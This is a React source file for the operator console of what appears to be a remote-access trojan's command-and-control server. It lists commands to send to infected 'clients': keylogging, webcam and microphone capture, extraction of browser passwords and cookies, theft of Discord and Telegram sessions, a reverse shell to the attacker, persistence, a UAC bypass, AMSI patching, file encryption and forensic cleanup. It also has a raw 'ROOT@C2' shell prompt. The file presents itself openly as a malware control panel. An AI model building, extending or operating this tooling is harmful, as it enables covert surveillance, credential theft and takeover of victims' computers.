'use client'

import { useState, useEffect, useRef, useCallback } from 'react'
import { Send, Terminal, Eye, Database, Lock, Network, Trash2, Settings, MousePointer2, Search } from 'lucide-react'
import { Card, CardContent, CardTitle } from '@/components/ui/card'
import { Button } from '@/components/ui/button'

interface CommandPanelProps {
  selectedClient: string | null
}

interface Command {
  id: string
  category: string
  name: string
  description: string
  icon: any
  color: string
  params?: string[]
}

const commands: Command[] = [
  // Execution
  { id: 'shell', category: 'Execution', name: 'Shell Command', description: 'Execute system shell commands', icon: Terminal, color: 'text-blue-400', params: ['command'] },
  { id: 'powershell', category: 'Execution', name: 'PowerShell', description: 'Execute PowerShell commands', icon: Terminal, color: 'text-blue-400', params: ['command'] },
  { id: 'script', category: 'Execution', name: 'Run Script', description: 'Execute Python/PowerShell scripts', icon: Terminal, color: 'text-blue-400', params: ['code'] },

  // Files
  { id: 'download', category: 'Files', name: 'Download File', description: 'Download file from client', icon: Database, color: 'text-cyan-400', params: ['path'] },
  { id: 'upload', category: 'Files', name: 'Upload File', description: 'Upload file to client', icon: Database, color: 'text-cyan-400', params: ['path', 'content'] },
  { id: 'write_file', category: 'Files', name: 'Upload / Write File', description: 'Write raw bytes to client file', icon: Database, color: 'text-cyan-400', params: ['path', 'content'] },
  { id: 'file_browser', category: 'Files', name: 'File Browser', description: 'Browse client file system', icon: Database, color: 'text-cyan-400', params: ['path'] },
  { id: 'file_crypt', category: 'Files', name: 'File Encryption', description: 'Encrypt/decrypt files', icon: Lock, color: 'text-cyan-400', params: ['path', 'action'] },
  { id: 'list_drives', category: 'Files', name: 'List Logical Drives', description: 'List all mounted drives', icon: Database, color: 'text-cyan-400' },

  // Surveillance
  { id: 'screenshot', category: 'Surveillance', name: 'Screenshot', description: 'Capture client screen', icon: Eye, color: 'text-purple-400', params: ['height'] },
  { id: 'webcam', category: 'Surveillance', name: 'Webcam Capture', description: 'Capture webcam images', icon: Eye, color: 'text-purple-400', params: ['resolution'] },
  { id: 'stream', category: 'Surveillance', name: 'Screen Stream', description: 'Live screen streaming', icon: Eye, color: 'text-purple-400', params: ['action', 'fps', 'height'] },
  { id: 'webcam_stream', category: 'Surveillance', name: 'Webcam Stream', description: 'Live webcam streaming', icon: Eye, color: 'text-purple-400', params: ['action', 'fps'] },
  { id: 'microphone', category: 'Surveillance', name: 'Microphone Record', description: 'Record audio from microphone', icon: Eye, color: 'text-purple-400', params: ['duration'] },
  { id: 'keylog', category: 'Surveillance', name: 'Keylogger Control', description: 'Start/Stop/Dump keystrokes', icon: Eye, color: 'text-purple-400', params: ['action'] },
  { id: 'clipboard', category: 'Surveillance', name: 'Clipboard Control', description: 'Get/Set clipboard', icon: Eye, color: 'text-purple-400', params: ['action', 'text'] },
  { id: 'active_window', category: 'Surveillance', name: 'Active Window', description: 'Get foreground window title', icon: Eye, color: 'text-purple-400' },
  { id: 'window_logger', category: 'Surveillance', name: 'Window Logger', description: 'Background window tracker', icon: Eye, color: 'text-purple-400', params: ['action'] },
  { id: 'recstream', category: 'Surveillance', name: 'Record Screen', description: 'Record screen to MP4', icon: Eye, color: 'text-purple-400', params: ['action'] },
  { id: 'recwcam', category: 'Surveillance', name: 'Record Webcam', description: 'Record webcam to MP4', icon: Eye, color: 'text-purple-400', params: ['action'] },

  // Credentials
  { id: 'browser_passwords', category: 'Credentials', name: 'Browser Passwords', description: 'Extract saved passwords', icon: Lock, color: 'text-red-400' },
  { id: 'browser_cookies', category: 'Credentials', name: 'Browser Cookies', description: 'Extract browser cookies', icon: Lock, color: 'text-red-400' },
  { id: 'wifi_passwords', category: 'Credentials', name: 'WiFi Passwords', description: 'Extract WiFi credentials', icon: Lock, color: 'text-red-400' },
  { id: 'chromelevator', category: 'Credentials', name: 'Chromelevator', description: 'Advanced Chrome extractor', icon: Lock, color: 'text-red-400' },
  { id: 'extract_discord', category: 'Credentials', name: 'Extract Discord', description: 'Steal Discord session tokens', icon: Lock, color: 'text-red-400' },
  { id: 'extract_telegram', category: 'Credentials', name: 'Extract Telegram', description: 'Package Telegram session to ZIP', icon: Lock, color: 'text-red-400' },
  { id: 'extract_outlook', category: 'Credentials', name: 'Extract Outlook', description: 'Find Outlook profiles and PSTs', icon: Lock, color: 'text-red-400' },

  // System & Network
  { id: 'system_info', category: 'System', name: 'System Info', description: 'Get system information', icon: Network, color: 'text-green-400' },
  { id: 'geolocation', category: 'System', name: 'Geolocation', description: 'Get location via public IP', icon: Network, color: 'text-green-400' },
  { id: 'process', category: 'System', name: 'Process Manager', description: 'List/kill processes', icon: Network, color: 'text-green-400', params: ['action', 'pid'] },
  { id: 'registry', category: 'System', name: 'Registry Manager', description: 'Read/write registry', icon: Network, color: 'text-green-400', params: ['action', 'path'] },
  { id: 'port_scan', category: 'Network', name: 'Port Scanner', description: 'Scan network ports', icon: Network, color: 'text-blue-400', params: ['ip', 'ports'] },
  { id: 'netstat', category: 'Network', name: 'Netstat', description: 'List active network connections', icon: Network, color: 'text-blue-400' },
  { id: 'arp', category: 'Network', name: 'ARP Table', description: 'Dump internal ARP mappings', icon: Network, color: 'text-blue-400' },
  { id: 'wifi_control', category: 'Network', name: 'WiFi Manager', description: 'Scan, Enable or Disable WiFi', icon: Network, color: 'text-blue-400', params: ['action'] },
  { id: 'bluetooth_control', category: 'Network', name: 'Bluetooth Manager', description: 'Enable or Disable Bluetooth', icon: Network, color: 'text-blue-400', params: ['action'] },
  { id: 'socks', category: 'Network', name: 'SOCKS5 Proxy', description: 'Start cross-platform tunneling', icon: Network, color: 'text-blue-400', params: ['action', 'port'] },
  { id: 'reverse_shell', category: 'Network', name: 'Reverse Shell', description: 'Reverse connect back to attacker', icon: Terminal, color: 'text-blue-400', params: ['ip', 'port'] },
  { id: 'service', category: 'System', name: 'Service Control', description: 'Manage Windows services', icon: Network, color: 'text-green-400', params: ['action', 'name'] },
  { id: 'av_discovery', category: 'System', name: 'AV Discovery', description: 'Detect installed Antivirus engines', icon: Lock, color: 'text-green-400' },

  // Persistence
  { id: 'persistence', category: 'Persistence', name: 'Enable Persistence', description: 'Install persistence mechanism', icon: Lock, color: 'text-amber-400' },
  { id: 'unpersist', category: 'Persistence', name: 'Remove Persistence', description: 'Uninstall persistence', icon: Lock, color: 'text-amber-400' },
  { id: 'elevate', category: 'Persistence', name: 'Request Admin (UAC)', description: 'Trigger explicit UAC elevation', icon: Lock, color: 'text-amber-400' },
  { id: 'uac_bypass', category: 'Persistence', name: 'Silent UAC Bypass', description: 'Automated Fodhelper elevation', icon: Lock, color: 'text-amber-400', params: ['program'] },
  { id: 'amsi_bypass', category: 'Persistence', name: 'AMSI Patch', description: 'Patch AMSI in memory', icon: Lock, color: 'text-amber-400' },
  { id: 'enable_rdp', category: 'Persistence', name: 'Enable RDP', description: 'Open RDP daemon and Firewall', icon: Lock, color: 'text-amber-400', params: ['adduser'] },
  { id: 'unelevate', category: 'Persistence', name: 'Drop Privileges', description: 'Relinquish Administrator token', icon: Lock, color: 'text-amber-400' },
  { id: 'wmi', category: 'Persistence', name: 'WMI Persistence', description: 'Install WMI persistence', icon: Lock, color: 'text-amber-400', params: ['cmd'] },

  // Interaction
  { id: 'open_url', category: 'Interaction', name: 'Open URL', description: 'Force open browser link', icon: Terminal, color: 'text-orange-400', params: ['url'] },
  { id: 'message_box', category: 'Interaction', name: 'Message Box', description: 'Pop up GUI alert', icon: Terminal, color: 'text-orange-400', params: ['title', 'text'] },
  { id: 'volume_control', category: 'Interaction', name: 'Volume Control', description: 'Get/Set/Mute system volume', icon: Terminal, color: 'text-orange-400', params: ['action', 'level'] },
  { id: 'brightness_control', category: 'Interaction', name: 'Brightness Control', description: 'Get/Set screen brightness', icon: Terminal, color: 'text-orange-400', params: ['action', 'level'] },
  { id: 'wallpaper', category: 'Interaction', name: 'Set Wallpaper', description: 'Change desktop background', icon: Terminal, color: 'text-orange-400', params: ['path'] },
  { id: 'power', category: 'Interaction', name: 'Power Control', description: 'Lock/Shutdown/Reboot', icon: Terminal, color: 'text-orange-400', params: ['action'] },
  { id: 'input_control', category: 'Interaction', name: 'Mouse & Keyboard', description: 'Remote control system inputs', icon: Terminal, color: 'text-orange-400', params: ['action', 'x', 'y', 'button', 'text'] },
  { id: 'block_input', category: 'Interaction', name: 'Block Input', description: 'Disable local input devices', icon: Lock, color: 'text-orange-400', params: ['state'] },
  { id: 'browser_kill', category: 'Interaction', name: 'Kill Browsers', description: 'Force crash web browsers', icon: Trash2, color: 'text-orange-400' },
  { id: 'set_autorun', category: 'Interaction', name: 'Autorun Scripts', description: 'Configure reconnect commands', icon: Terminal, color: 'text-orange-400', params: ['json'] },
  
  // Cleanup
  { id: 'abort', category: 'Cleanup', name: 'Abort Task', description: 'Kill asynchronous module by ID', icon: Trash2, color: 'text-gray-400', params: ['id'] },
  { id: 'clean_traces', category: 'Cleanup', name: 'Clean Traces', description: 'Remove forensic evidence', icon: Trash2, color: 'text-gray-400' },
  { id: 'self_destruct', category: 'Cleanup', name: 'Self Destruct', description: 'Remove malware from system', icon: Trash2, color: 'text-gray-400' }
]

const paramOptions: Record<string, Record<string, string[]>> = {
  'file_crypt': { action: ['encrypt', 'decrypt'] },
  'screenshot': { height: ['1080', '720', '480', '360'] },
  'webcam': { resolution: ['1920x1080', '1280x720', '640x480'] },
  'stream': { action: ['start', 'stop'], fps: ['10', '20', '30'], height: ['1080', '720', '480'] },
  'webcam_stream': { action: ['start', 'stop'], fps: ['10', '20', '30'] },
  'keylog': { action: ['start', 'stop', 'dump', 'status'] },
  'clipboard': { action: ['get', 'set'] },
  'window_logger': { action: ['start', 'stop', 'dump', 'status'] },
  'recstream': { action: ['start', 'stop'] },
  'recwcam': { action: ['start', 'stop'] },
  'process': { action: ['list', 'kill'] },
  'registry': { action: ['read', 'write', 'delete'] },
  'wifi_control': { action: ['scan', 'enable', 'disable', 'status'] },
  'bluetooth_control': { action: ['enable', 'disable', 'status'] },
  'socks': { action: ['start', 'stop'] },
  'service': { action: ['start', 'stop', 'list'] },
  'enable_rdp': { adduser: ['true', 'false'] },
  'volume_control': { action: ['get', 'set', 'mute', 'unmute'] },
  'brightness_control': { action: ['get', 'set'] },
  'power': { action: ['lock', 'logout', 'reboot', 'shutdown'] },
  'input_control': { action: ['move', 'click', 'type'], button: ['left', 'right', 'middle'] },
  'block_input': { state: ['true', 'false'] }
}

const categories = Array.from(new Set(commands.map((cmd) => cmd.category)))

export default function CommandPanel({ selectedClient }: CommandPanelProps) {
  const [selectedCategory, setSelectedCategory] = useState<string>(categories[0])
  const [selectedCommandId, setSelectedCommandId] = useState<string | null>(null)
  const [commandOutput, setCommandOutput] = useState<Array<{ id: string; cmd: string; output: string }>>([])
  const [inputValue, setInputValue] = useState('')
  const [searchQuery, setSearchQuery] = useState('')
  const [params, setParams] = useState<Record<string, Record<string, string>>>({})

  const selectedCommand = commands.find(c => c.id === selectedCommandId) || null

  const filteredCommands = commands.filter(cmd => 
    cmd.name.toLowerCase().includes(searchQuery.toLowerCase()) || 
    cmd.description.toLowerCase().includes(searchQuery.toLowerCase()) ||
    cmd.category.toLowerCase().includes(searchQuery.toLowerCase())
  );
  
  const filteredCategories = Array.from(new Set(filteredCommands.map(cmd => cmd.category)));

  useEffect(() => {
    if (!selectedClient) return
    
    const fetchHistory = async () => {
      try {
        const res = await fetch(`/api/commands?action=history&clientId=${selectedClient}`)
        if (res.ok) {
          const data = await res.json()
          const formatted = data.map((cmd: any) => {
            let resultDisplay = '→ Processing...'
            if (cmd.status === 'completed') {
              try {
                let parsedResult = cmd.result
                if (typeof parsedResult === 'string') {
                  try {
                    parsedResult = JSON.parse(parsedResult)
                  } catch (e) {}
                }

                if (typeof parsedResult === 'string') {
                   resultDisplay = '→\n' + parsedResult
                } else if (parsedResult && typeof parsedResult === 'object') {
                   if (parsedResult.stdout !== undefined || parsedResult.stderr !== undefined) {
                      resultDisplay = ''
                      if (parsedResult.stdout) resultDisplay += `[STDOUT]\n${parsedResult.stdout}\n`
                      if (parsedResult.stderr) resultDisplay += `[STDERR]\n${parsedResult.stderr}\n`
                      resultDisplay = resultDisplay.trim() || '→ (Command Executed Successfully)'
                   } else {
                      resultDisplay = '→\n' + JSON.stringify(parsedResult, null, 2)
                   }
                } else {
                   resultDisplay = '→ ' + String(parsedResult)
                }
              } catch {
                resultDisplay = '→ ' + String(cmd.result)
              }
            } else if (cmd.status === 'failed') {
              resultDisplay = '→ Error: ' + cmd.error_message
            }
            
            return {
              id: cmd.id,
              cmd: `${cmd.command_name} ${cmd.parameters ? JSON.stringify(cmd.parameters) : ''}`,
              output: `[${new Date(cmd.created_at).toLocaleTimeString()}] Status: ${cmd.status}\n${resultDisplay}`
            }
          }).reverse() // oldest first for terminal-like display
          setCommandOutput(formatted)
        }
      } catch (e) {}
    }

    fetchHistory()
    const interval = setInterval(fetchHistory, 400)
    return () => clearInterval(interval)
  }, [selectedClient])

  const handleParamChange = (cmdId: string, param: string, value: string) => {
    setParams(prev => ({
      ...prev,
      [cmdId]: {
        ...(prev[cmdId] || {}),
        [param]: value
      }
    }))
  }

  const executeCommand = async (command: Command, customParams?: any) => {
    const cmdParams = customParams || params[command.id] || {}
    
    try {
      const resp = await fetch('/api/commands', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          client_id: selectedClient,
          command_type: 'execution',
          command_name: command.id,
          parameters: cmdParams
        })
      })
      const data = await resp.json()
      
      if (resp.ok) {
        await fetch('/api/execute', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({
             commandId: data.id,
             clientId: selectedClient,
             commandType: 'execution',
             commandName: command.id,
             parameters: cmdParams
           })
        })
        
        const newEntry = {
          id: Math.random().toString(),
          cmd: command.name,
          output: `[${new Date().toLocaleTimeString()}] Queued: ${command.name}`,
        }
        setCommandOutput([...commandOutput, newEntry])
      }
    } catch (e: any) {}
  }

  const handleDirectCommand = async () => {
    if (!inputValue.trim()) return
    
    try {
      const resp = await fetch('/api/commands', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          client_id: selectedClient,
          command_type: 'execution',
          command_name: 'shell',
          parameters: { command: inputValue }
        })
      })
      const data = await resp.json()
      
      if (resp.ok) {
        await fetch('/api/execute', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({
             commandId: data.id,
             clientId: selectedClient,
             commandType: 'execution',
             commandName: 'shell',
             parameters: { command: inputValue }
           })
        })
        setInputValue('')
      }
    } catch (e) {}
  }

  if (!selectedClient) {
    return (
      <div className="flex items-center justify-center h-full">
        <Card className="p-12 text-center max-w-md bg-card/50">
          <Settings className="w-12 h-12 mx-auto mb-4 text-muted-foreground opacity-50" />
          <CardTitle className="mb-2">No Client Selected</CardTitle>
          <p className="text-muted-foreground text-sm">Select a client from the left panel to execute commands</p>
        </Card>
      </div>
    )
  }

  return (
    <div className="flex h-full bg-[#030712] overflow-hidden">
      {/* Left Sidebar: Command Library */}
      <div className="w-64 border-r border-white/5 bg-black/40 backdrop-blur-xl flex flex-col min-h-0">
        <div className="p-4 border-b border-white/5">
          <h2 className="text-[9px] font-black flex items-center gap-2 mb-3 tracking-[0.2em] text-primary/80">
            <Terminal className="w-3 h-3" /> COMMANDS
          </h2>
          <div className="relative group">
            <Search className="w-3 h-3 absolute left-3 top-1/2 -translate-y-1/2 text-muted-foreground/50 group-focus-within:text-primary transition-colors" />
            <input 
              type="text" 
              placeholder="SEARCH..." 
              value={searchQuery}
              onChange={(e) => setSearchQuery(e.target.value)}
              className="w-full bg-white/[0.02] border border-white/5 rounded-lg pl-8 pr-3 py-2 text-[10px] text-foreground focus:outline-none focus:border-primary/30 placeholder:text-muted-foreground/20 transition-all font-mono"
            />
          </div>
        </div>
        
        <div className="flex-1 overflow-y-auto custom-scrollbar">
          {filteredCategories.length === 0 ? (
            <div className="p-8 text-center text-[10px] text-muted-foreground uppercase opacity-50 font-mono tracking-widest">
              No nodes detected
            </div>
          ) : (
            filteredCategories.map((cat) => (
              <div key={cat} className="mb-6">
                <div className="px-5 py-2 text-[8px] font-bold text-white/10 uppercase tracking-[0.3em]">
                  {cat}
                </div>
                <div className="px-2 space-y-0.5">
                  {filteredCommands.filter(c => c.category === cat).map((cmd) => (
                  <button
                    key={cmd.id}
                    onClick={() => setSelectedCommandId(cmd.id)}
                    className={`w-full text-left px-3 py-2 rounded-lg text-[10px] font-medium transition-all flex items-center gap-2 border border-transparent ${
                      selectedCommandId === cmd.id 
                      ? 'bg-primary/5 border-primary/20 text-primary' 
                      : 'hover:bg-white/5 text-muted-foreground hover:text-foreground'
                    }`}
                  >
                    <cmd.icon className={`w-3 h-3 ${selectedCommandId === cmd.id ? 'text-primary' : cmd.color + ' opacity-50'}`} />
                    <span className="truncate">{cmd.name}</span>
                  </button>
                ))}
              </div>
            </div>
            ))
          )}
        </div>
      </div>

      {/* Center/Right: Execution & Output */}
      <div className="flex-1 flex flex-col min-w-0">
        <div className="flex-1 flex flex-col xl:flex-row min-h-0">
          {/* Selected Command Detail */}
          <div className="w-full xl:w-72 p-6 border-r border-white/5 flex flex-col bg-white/[0.01]">
            {selectedCommand ? (
              <div className="space-y-6 animate-in fade-in slide-in-from-right-2 duration-300">
                <div className="border border-white/5 p-4 rounded-xl relative group bg-white/[0.02]">
                  <div className="flex items-center gap-3 mb-2">
                     <selectedCommand.icon className={`w-4 h-4 ${selectedCommand.color}`} />
                     <h2 className="text-sm font-bold text-foreground tracking-tight uppercase">{selectedCommand.name}</h2>
                  </div>
                  <p className="text-[10px] text-muted-foreground leading-relaxed">
                    {selectedCommand.description}
                  </p>
                </div>

                {selectedCommand.id === 'input_control' ? (
                  <InteractiveTrackpad onAction={(p) => executeCommand(selectedCommand, p)} />
                ) : selectedCommand.params && (
                  <div className="space-y-5">
                    <h3 className="text-[10px] font-black text-primary/40 uppercase tracking-[0.3em]">Payload Configuration</h3>
                    <div className="space-y-4">
                        {selectedCommand.params.map((param) => {
                          const options = paramOptions[selectedCommand.id]?.[param]
                          const isNumber = ['level', 'duration', 'fps', 'x', 'y'].includes(param)

                          return (
                          <div key={param} className="space-y-2">
                            <label className="text-[10px] font-bold text-muted-foreground uppercase tracking-widest block pl-1">{param.replace(/_/g, ' ')}</label>
                            {options ? (
                              <select
                                value={params[selectedCommand.id]?.[param] || ''}
                                onChange={(e) => handleParamChange(selectedCommand.id, param, e.target.value)}
                                className="w-full px-4 py-3 bg-white/[0.03] border border-white/10 rounded-xl focus:outline-none focus:border-primary/50 text-xs text-foreground transition-all font-mono appearance-none cursor-pointer hover:bg-white/[0.05]"
                              >
                                <option value="" disabled className="bg-[#030712]">SELECT {param.toUpperCase()}...</option>
                                {options.map(opt => (
                                  <option key={opt} value={opt} className="bg-[#030712]">{opt.toUpperCase()}</option>
                                ))}
                              </select>
                            ) : (
                              <input 
                                type={isNumber ? "number" : "text"}
                                value={params[selectedCommand.id]?.[param] || ''}
                                onChange={(e) => handleParamChange(selectedCommand.id, param, e.target.value)}
                                placeholder={`ENTER ${param.toUpperCase()}...`}
                                className="w-full px-4 py-3 bg-white/[0.03] border border-white/10 rounded-xl focus:outline-none focus:border-primary/50 text-xs text-foreground placeholder:text-muted-foreground/20 transition-all font-mono"
                              />
                            )}
                          </div>
                          )
                        })}
                    </div>
                  </div>
                )}

                {selectedCommand.id !== 'input_control' && (
                  <Button 
                     onClick={() => executeCommand(selectedCommand)}
                     className="w-full py-6 text-[10px] font-bold tracking-[0.1em] uppercase rounded-xl bg-primary text-black hover:bg-primary/90 transition-all active:scale-[0.98] mt-2"
                  >
                    <Send className="w-3 h-3 mr-2" /> SEND COMMAND
                  </Button>
                )}
              </div>
            ) : (
              <div className="h-full flex flex-col items-center justify-center text-center p-8 opacity-20">
                <MousePointer2 className="w-12 h-12 text-muted-foreground mb-6 animate-pulse" />
                <h3 className="text-xs font-black tracking-widest text-muted-foreground uppercase">Targeting offline...</h3>
              </div>
            )}
          </div>

          {/* Real-time Console */}
          <div className="flex-1 flex flex-col bg-[#020308] relative border-l border-white/5 shadow-[inset_20px_0_60px_rgba(0,0,0,0.8)]">
             <div className="px-6 py-4 border-b border-white/5 bg-white/[0.01] flex items-center justify-between">
                <span className="text-[10px] font-black text-primary flex items-center gap-3 tracking-[0.2em]">
                   <div className="w-2 h-2 rounded-full bg-primary shadow-[0_0_10px_rgba(0,240,255,1)] animate-ping" /> REALTIME_UPLINK
                </span>
                <button 
                  onClick={() => setCommandOutput([])}
                  className="text-[9px] font-bold text-muted-foreground hover:text-red-500 transition-colors flex items-center gap-2 uppercase tracking-widest"
                >
                  <Trash2 className="w-3.5 h-3.5" /> PURGE_LOGS
                </button>
             </div>
             
             <div className="flex-1 overflow-y-auto p-8 space-y-6 font-mono scrollbar-thin scrollbar-thumb-white/5 selection:bg-primary/30">
                {commandOutput.length === 0 ? (
                  <div className="h-full items-center justify-center flex flex-col opacity-10 space-y-4">
                      <Terminal className="w-16 h-16" />
                      <p className="text-[9px] font-black tracking-[0.5em] uppercase">SYSTEM_IDLE: AWAITING_INPUT</p>
                  </div>
                ) : (
                  commandOutput.map((entry) => (
                    <div key={entry.id} className="text-[11px] space-y-2 group animate-in slide-in-from-bottom-2 duration-300">
                      <div className="flex items-center gap-3">
                         <div className="h-px flex-1 bg-white/[0.05]" />
                         <span className="text-[9px] font-black text-white/20 uppercase tracking-widest">
                           SIGNAL_RECEIVED
                         </span>
                         <div className="h-px flex-1 bg-white/[0.05]" />
                      </div>
                      <div className="text-primary font-bold opacity-70 group-hover:opacity-100 transition-opacity">
                        <span className="text-white/20 mr-2">#</span> {entry.cmd.toUpperCase()}
                      </div>
                      <div className="pl-4 text-white/60 whitespace-pre-wrap break-all leading-relaxed font-mono bg-white/[0.02] p-4 rounded-xl border border-white/5 group-hover:border-white/10 transition-all">
                        {entry.output}
                      </div>
                    </div>
                  ))
                )}
             </div>

             {/* Direct Input Overlay */}
             <div className="p-8 bg-black/60 backdrop-blur-2xl border-t border-white/5">
                <div className="relative group">
                   <div className="absolute left-4 top-1/2 -translate-y-1/2 text-primary font-black text-[10px] tracking-tighter opacity-50">$ ROOT@C2:</div>
                   <input
                     type="text"
                     value={inputValue}
                     onChange={(e) => setInputValue(e.target.value)}
                     onKeyPress={(e) => e.key === 'Enter' && handleDirectCommand()}
                     placeholder="EXECUTE RAW KERNEL SIGNAL..."
                     className="w-full pl-24 pr-6 py-4 bg-white/[0.02] hover:bg-white/[0.04] border border-white/10 rounded-2xl text-[11px] text-white font-mono transition-all focus:outline-none focus:border-primary/50 focus:ring-4 focus:ring-primary/5 placeholder:text-muted-foreground/10"
                   />
                </div>
             </div>
          </div>
        </div>
      </div>
    </div>
  )
}

const InteractiveTrackpad = ({ onAction }: { onAction: (params: any) => void }) => {
  const throttleRef = useRef(0)

  const getCoordinates = (e: React.MouseEvent<HTMLDivElement>) => {
    const rect = e.currentTarget.getBoundingClientRect()
    // Map to standard 1920x1080 bounds
    const x = Math.round(((e.clientX - rect.left) / rect.width) * 1920)
    const y = Math.round(((e.clientY - rect.top) / rect.height) * 1080)
    return { x: x.toString(), y: y.toString() }
  }

  const handleMouseMove = (e: React.MouseEvent<HTMLDivElement>) => {
    const now = Date.now()
    if (now - throttleRef.current < 200) return // Throttle to prevent API flood
    throttleRef.current = now
    const { x, y } = getCoordinates(e)
    onAction({ action: 'move', x, y, button: '', text: '' })
  }

  const handleClick = (e: React.MouseEvent<HTMLDivElement>) => {
    e.preventDefault()
    e.stopPropagation()
    const { x, y } = getCoordinates(e)
    let button = 'left'
    if (e.button === 1) button = 'middle'
    if (e.button === 2) button = 'right'
    onAction({ action: 'click', x, y, button, text: '' })
  }

  const handleKeyDown = (e: React.KeyboardEvent<HTMLDivElement>) => {
    e.preventDefault()
    e.stopPropagation()
    if (['Shift', 'Control', 'Alt', 'Meta'].includes(e.key)) return
    onAction({ action: 'type', text: e.key, x: '0', y: '0', button: '' })
  }

  return (
    <div className="space-y-3 mt-4">
      <h3 className="text-[10px] font-bold text-muted-foreground uppercase tracking-wider">Virtual Trackpad</h3>
      <div 
        className="w-full aspect-video bg-[#050505] border border-white/10 rounded-lg relative cursor-crosshair flex items-center justify-center group focus:outline-none focus:ring-1 focus:ring-primary shadow-inner"
        tabIndex={0}
        onMouseMove={handleMouseMove}
        onMouseDown={handleClick}
        onContextMenu={(e) => e.preventDefault()}
        onKeyDown={handleKeyDown}
      >
        <span className="text-white/20 text-xs font-medium select-none group-hover:text-white/40 transition-colors pointer-events-none text-center px-4">
          Click to focus.
          <br />
          Move mouse pointer to move client cursor.
          <br />
          Click or Type to send inputs.
        </span>
      </div>
      <p className="text-[10px] text-muted-foreground text-center">
        Left/Right click inside the box. Keyboard typing works while focused. Actions execute automatically.
      </p>
    </div>
  )
}

